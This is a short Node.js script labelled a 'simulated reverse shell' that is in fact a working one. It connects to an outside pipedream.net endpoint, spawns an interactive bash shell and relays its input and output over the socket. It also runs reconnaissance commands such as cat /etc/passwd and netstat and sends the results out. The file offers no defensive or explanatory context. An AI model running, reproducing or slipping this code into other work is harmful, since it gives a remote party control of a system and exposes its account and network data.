const net = require('net');
const { spawn } = require('child_process');

const HOST = 'eop3b98jxkzuqt4.m.pipedream.net';
const PORT = 80;

console.log('Simulated reverse shell started');

const client = new net.Socket();
client.connect(PORT, HOST, () => {
    console.log(`Connected to ${HOST}:${PORT}`);

    client.write('Reverse shell connection established\n');

    const shell = spawn('/bin/bash', ['-i']);

    client.on('data', (data) => {
        shell.stdin.write(data);
    });

    shell.stdout.on('data', (data) => {
        client.write(data);
    });

    shell.stderr.on('data', (data) => {
        client.write(data);
    });

    shell.on('exit', (code) => {
        console.log(`Shell exited with code ${code}`);
        client.destroy();
    });

    // Simulate some initial commands
    const initialCommands = [
        'whoami',
        'pwd',
        'ls -la',
        'cat /etc/passwd',
        'netstat -an'
    ];

    initialCommands.forEach((command, index) => {
        setTimeout(() => {
            console.log(`Executing: ${command}`);
            shell.stdin.write(`${command}\n`);
        }, index * 2000);
    });
});

client.on('error', (error) => {
    console.error('Failed to connect:', error.message);
});

client.on('close', () => {
    console.log('Connection closed');
});
